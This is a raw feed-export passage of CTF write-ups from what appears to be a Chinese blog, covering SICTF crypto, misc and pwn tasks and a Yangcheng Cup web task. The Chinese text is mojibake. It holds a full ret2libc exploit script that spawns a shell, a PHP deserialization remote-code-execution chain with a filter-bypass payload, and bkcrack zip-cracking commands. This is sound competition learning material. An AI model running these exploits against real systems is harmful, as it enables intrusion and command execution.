class="number">14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350</span></span><br><span class="line">c3 = <span class="number">3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855</span></span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">zip</span>(c, n))</span><br><span class="line">x, n = CRT(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>, <span class="number">18</span>):</span><br><span class="line">    e = i</span><br><span class="line">    m = gmpy2.iroot(gmpy2.mpz(x), e)[<span class="number">0</span>].digits()</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ç­¾åˆ°-Welcome"><a href="#ç­¾åˆ°-Welcome" class="headerlink" title="[ç­¾åˆ°]Welcome"></a>[ç­¾åˆ°]Welcome</h2><p>å…³æ³¨å¾®ä¿¡å…¬ä¼—å·å¹¶å‘é€â€SICTF2023â€å°±å¯ä»¥è·å¾—flagè¾£ï¼</p><h2 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h2><ol><li><p>å…ˆæ˜¯zipä¼ªåŠ å¯†ï¼Œç”¨winrarä¿®å¤å³å¯è§£å‹å‡ºä¸€å¼ å›¾ç‰‡ã€‚</p></li><li><p>ç”¨zstegæŸ¥çœ‹ä¸€ä¸‹å›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢éšå†™äº†ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="/SICTF/m_1_1.png"></p></li><li><p>æå–å‡ºæ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zsteg Pixel_art.png -e &quot;b1,rgb,lsb,xy&quot; -&gt;out.png</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡  <a href="https://cn.office-converter.com/png-to-rgb">åœ¨çº¿ç½‘ç«™</a>ï¼ŒæŠŠæ–‡ä»¶çš„rgbä¿¡æ¯æå–å‡ºæ¥ï¼Œå¯ä»¥å¾—åˆ°ä¸€äº›.?!ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.</span><br></pre></td></tr></table></figure></li><li><p>ookç¼–ç ï¼Œ <a href="https://www.splitbrain.org/services/ook">åœ¨çº¿ç½‘ç«™</a> è§£ç ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/SICTF/m_1_2.png"></p></li></ol><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><ol><li><p>ç”¨Audacityæ‰“å¼€é™„ä»¶ï¼Œå‘ç°ç±»ä¼¼morseçš„ä¸œè¥¿ã€‚</p><p><img src="/SICTF/m_3_1.png"></p></li><li><p>æ‰‹æŠ„ä¸‹æ¥ï¼Œå³å¯å¾—åˆ°ä¸€ä¸²è«æ–¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-.</span><br></pre></td></tr></table></figure></li><li><p>morseåœ¨çº¿è§£ç åå³å¯å¾—åˆ°flagã€‚</p><p><img src="/SICTF/m_3_2.png"></p></li></ol><h2 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/zysgmzb/p/16834602.html">https://www.cnblogs.com/zysgmzb/p/16834602.html</a></p><ol><li><p>å…ˆæŠŠpngçš„å¤´å†™åˆ°ä¸€ä¸ªæ–‡ä»¶å†…ã€‚</p><p><img src="/SICTF/m_4_1.png"></p></li><li><p>bkcrackæ”»å‡»ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -p plan.out -o 0</span><br></pre></td></tr></table></figure><p><img src="/SICTF/m_4_2.png"></p></li><li><p>æå–å‡ºflag.pngã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></figure><p><img src="/SICTF/m_4_3.png"></p></li><li><p>æœ€ååœ¨pngçš„å°¾éƒ¨çœ‹åˆ°flagã€‚</p><p><img src="/SICTF/m_4_4.png"></p></li></ol><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ç­¾åˆ°-Shop"><a href="#ç­¾åˆ°-Shop" class="headerlink" title="[ç­¾åˆ°]Shop"></a>[ç­¾åˆ°]Shop</h2><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œncè¿ä¸Šè¾“å…¥å‡ ä¸ª-1å³å¯æ‹¿åˆ°flag</p><h2 id="Different-gadget"><a href="#Different-gadget" class="headerlink" title="Different_gadget"></a>Different_gadget</h2><p>åˆ©ç”¨readçš„rdxå’Œrsiæ®‹ç•™ï¼Œret2writeï¼Œè°ƒç”¨writeæ³„éœ²å¤§é‡åœ°å€ï¼Œä»è€Œè·å–libcåŸºåœ°å€ï¼Œç„¶åç¬¬äºŒæ¬¡readå»getshellå³å¯ã€‚å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ckyan.pwn.my_script <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;attachment&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> binary != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;210.44.151.51&quot;</span></span><br><span class="line">    port = <span class="string">&quot;10268&quot;</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    lib = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">init(lib, binary, p)</span><br><span class="line">context = init_context(<span class="string">&quot;tmux&quot;</span>, debug)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib != <span class="string">&quot;&quot;</span>:</span><br><span class="line">    libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug <span class="keyword">and</span> local:</span><br><span class="line">    ggdb()</span><br><span class="line"></span><br><span class="line">name     = <span class="keyword">lambda</span> obj : [name <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">if</span> <span class="built_in">globals</span>()[name] <span class="keyword">is</span> obj][<span class="number">0</span>]</span><br><span class="line">set_libc = <span class="keyword">lambda</span> buf : set_libc_base_and_log(name(buf), buf)</span><br><span class="line">lg       = <span class="keyword">lambda</span> buf : log_addr(name(buf), buf)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">rwp_addr = <span class="number">0x404800</span></span><br><span class="line"></span><br><span class="line">pad1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad1 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad1 += p64(rwp_addr)</span><br><span class="line">pad1 += p64(<span class="number">0x4011CE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Hello!!!&#x27;</span>)</span><br><span class="line">s(pad1)</span><br><span class="line"></span><br><span class="line">r(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = r7f()</span><br><span class="line">lg(leak_addr)</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">128</span></span><br><span class="line">libc = lg(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ret = gadget(&quot;ret&quot;)</span></span><br><span class="line"><span class="comment"># pop_rdi_ret = gadget(&quot;pop rdi;ret&quot;)</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">bin_sh_addr = srch(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pad2 += <span class="string">b&#x27;a&#x27;</span> * padding</span><br><span class="line">pad2 += p64(rwp_addr)</span><br><span class="line">pad2 += p64(ret)</span><br><span class="line">pad2 += p64(pop_rdi_ret)</span><br><span class="line">pad2 += p64(bin_sh_addr)</span><br><span class="line">pad2 += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># D()</span></span><br><span class="line"></span><br><span class="line">s(pad2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
          <category> SICTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸæ¯</title>
      <link href="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="D0nâ€™t-pl4y-g4m3"><a href="#D0nâ€™t-pl4y-g4m3" class="headerlink" title="D0nâ€™t pl4y g4m3!!!"></a>D0nâ€™t pl4y g4m3!!!</h2><ol><li><p>æ‰“å¼€ç½‘é¡µï¼Œè®¿é—®<code>/p0p.php</code>ï¼Œ302è·³è½¬åˆ°ä¸€ä¸ªæ¸¸æˆé¡µé¢å»äº†ã€‚</p></li><li><p>æŠ“åŒ…å‘ç°phpçš„ç‰ˆæœ¬æ˜¯<code>7.4.21</code>ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„phpèƒ½è¯»æºç ï¼Œè¿˜å‘ç°æœ‰ä¸€ä¸ªhint.zipã€‚</p></li><li><p>ä¸‹è½½hint.zipï¼Œè§£å‹ååœ¨<code>hint.txt</code>æ–‡ä»¶ä¸­å¾—åˆ°è¿™æ ·ä¸€ä¸²ä¸œè¥¿ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ã–_0 0vO Ow0 0w0 Ã–_0 Ã–_O Ã–.O o_o 0.O OvO o.0 owo o.Ã– Ã–.Ã– Ovo 0_Ã– Ã–_o owO O.0 owo Ã–_o owO O.0 owo Ã–_0 0wÃ– O.0 0w0 Ã–_0 OwO ov0 owo o_O O.Ã– Ã–vo </span><br></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨åœ¨çº¿ç½‘ç«™ï¼ˆ<a href="https://zdjd.vercel.app/%EF%BC%89%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%E6%8F%90%E7%A4%BA%E3%80%82">https://zdjd.vercel.app/ï¼‰ï¼Œå³å¯å¾—åˆ°æç¤ºã€‚</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_3.png"></p></li><li><p>æ„é€ åŒ…è¯»å–æºç ã€‚</p><p>æ•°æ®åŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /p0p.php HTTP/1.1</span><br><span class="line">Host: tcp.cloud.dasctf.com:24054</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_1.png"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ†ææºç ï¼Œèƒ½å¤ŸçŸ¥é“å¯ä»¥åˆ©ç”¨<code>Yang</code>è¿™ä¸ªç±»çš„<code>__call</code>æ¥rceã€‚</p></li><li><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call1&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call2&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call3&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($name);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ary</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Bei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;rce=<span class="string">&quot;cat /tmp/catcatf1ag.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce1=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;now[<span class="string">&quot;YCB1&quot;</span>]=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>ä¹‹åå°†<code>system</code>åŒå†™ï¼Œå³å¯ç»•è¿‡<code>prohib</code>ã€‚</p></li><li><p>æœ€åçš„payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF=O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;syssystemtem&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_2.png"></p></li></ol><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><ol><li><p>è®¿é—®<code>www.zip</code>ï¼Œå¾—åˆ°æºç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æºç </span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> 